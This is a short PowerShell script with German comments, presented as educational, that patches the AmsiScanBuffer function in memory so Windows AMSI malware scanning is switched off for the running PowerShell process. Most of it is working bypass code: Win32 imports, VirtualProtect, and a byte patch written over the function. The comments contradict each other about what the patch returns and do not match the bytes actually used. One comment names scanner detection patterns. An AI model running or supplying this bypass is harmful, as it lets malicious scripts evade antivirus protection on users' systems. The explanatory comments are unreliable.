# AMSI Bypass: Memory Patching (AmsiScanBuffer)
# ===============================================
# ACHTUNG: Dies ist eine BILDUNGSDATEI. Nicht auf Produktivsystemen ausfuehren!
#
# TECHNIK: Patcht die Funktion AmsiScanBuffer() im Speicher so, dass sie
# immer AMSI_RESULT_CLEAN (0) zurueckgibt.
#
# WARUM ES FUNKTIONIERT:
# amsi.dll wird in jeden PowerShell-Prozess geladen. Die Funktion
# AmsiScanBuffer ist der zentrale Entry-Point fuer alle Scan-Anfragen.
# Durch Ueberschreiben der ersten Bytes mit einem "return 0" (AMSI_RESULT_CLEAN)
# wird jeder Scan-Aufruf sofort als "sauber" bewertet.
#
# x64 Patch-Bytes: mov eax, 0x80070057 (E_INVALIDARG) ; ret
# Dies bewirkt, dass AmsiScanBuffer einen Fehler zurueckgibt,
# den PowerShell als "scan not available" interpretiert.
#
# ERKENNUNG:
# Unser Scanner erkennt "VirtualAllocEx" und "WriteProcessMemory" als
# suspicious patterns. Die Technik erfordert VirtualProtect um den
# Speicherschutz aufzuheben.

# Variante 1: Einfaches Patching mit Add-Type
$code = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress, UIntPtr dwSize, 
        uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $code

$amsiDll = [Win32]::LoadLibrary("amsi.dll")
$amsiScanBuffer = [Win32]::GetProcAddress($amsiDll, "AmsiScanBuffer")

# Patch: xor eax, eax ; ret (return AMSI_RESULT_CLEAN)
$patch = [byte[]]@(0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0xFF, 0xC3)

$oldProtect = 0
[Win32]::VirtualProtect($amsiScanBuffer, [UIntPtr]::new($patch.Length), 0x40, [ref]$oldProtect)

[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiScanBuffer, $patch.Length)

[Win32]::VirtualProtect($amsiScanBuffer, [UIntPtr]::new($patch.Length), $oldProtect, [ref]$oldProtect)

Write-Host "AmsiScanBuffer patched - AMSI disabled for this process"
